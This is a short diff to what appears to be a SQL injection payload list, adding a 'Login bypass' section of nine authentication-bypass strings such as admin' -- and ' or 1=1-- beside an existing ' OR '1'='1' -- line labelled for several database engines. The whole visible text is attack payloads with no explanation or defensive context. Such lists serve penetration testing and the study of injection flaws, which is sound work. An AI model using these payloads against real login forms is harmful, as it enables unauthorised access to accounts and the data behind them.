@@ -1,5 +1,14 @@
 
 
+Login bypass
+admin' --  
+admin' #  
+admin'/*  
+' or 1=1--  
+' or 1=1#  
+' or 1=1/*  
+') or '1'='1--  
+') or ('1'='1--
 
 -- MySQL, MSSQL, Oracle, PostgreSQL, SQLite
 ' OR '1'='1' --
